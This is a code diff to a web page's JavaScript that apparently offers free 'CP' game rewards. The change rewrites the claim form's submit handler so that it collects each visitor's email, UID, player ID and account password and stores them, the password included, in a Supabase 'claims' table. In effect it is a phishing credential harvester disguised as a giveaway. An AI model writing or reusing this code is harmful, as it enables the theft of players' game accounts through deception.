@@ -10,10 +10,49 @@ rewards.forEach(button=>{
     selected=button.dataset.cp;
   });
 });
-document.querySelector('#claimForm').addEventListener('submit',e=>{
+document.querySelector('#claimForm').addEventListener('submit', async e => {
   e.preventDefault();
-  const result=document.querySelector('#result');
-  result.hidden=false;
-  if(!selected){result.textContent='Please select a CP reward first.';return;}
-  result.textContent='Claim request selected: '+selected+' CP.';
+
+  const result = document.querySelector('#result');
+
+  if (!selected) {
+    result.hidden = false;
+    result.textContent = 'Please select a CP reward first.';
+    return;
+  }
+
+  const form = e.target;
+
+  const email = form.querySelector('input[type="email"]')?.value.trim();
+  const uid = form.querySelector('[name="uid"]')?.value.trim();
+  const playerId = form.querySelector('[name="player_id"]')?.value.trim();
+  const password = form.querySelector('input[type="password"]')?.value.trim()
+  if (!email || !uid || !playerId || !password) {
+    result.hidden = false;
+    result.textContent = 'Please complete all required fields.';
+    return;
+  }
+
+  result.hidden = false;
+  result.textContent = 'Submitting claim...';
+
+  const { error } = await supabase
+    .from('claims')
+    .insert({
+      email: email,
+      uid: uid,
+      "Player ID": playerId,
+      password: password,
+      reward: selected
+      
+    });
+
+  if (error) {
+    console.error(error);
+    result.textContent = 'Claim could not be submitted. Please try again.';
+    return;
+  }
+
+  result.textContent = 'Claim submitted successfully!';
 });
+  
